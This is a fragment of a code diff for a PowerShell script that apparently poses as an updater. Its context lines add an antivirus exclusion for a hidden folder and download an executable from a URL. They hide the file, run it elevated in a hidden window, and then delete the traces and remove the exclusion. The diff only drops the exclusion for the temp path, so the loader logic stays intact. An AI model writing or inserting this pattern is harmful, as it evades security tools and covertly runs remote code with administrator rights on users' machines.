@@ -34,17 +34,12 @@ $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
     Add-Exclusion -Path $hiddenFolder
-    Add-Exclusion -Path $tempPath
-
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
-
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Start-Sleep -Seconds 5
-
     Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Exclusion -Path $tempPath
     Remove-Exclusion -Path $hiddenFolder
 }
 catch {
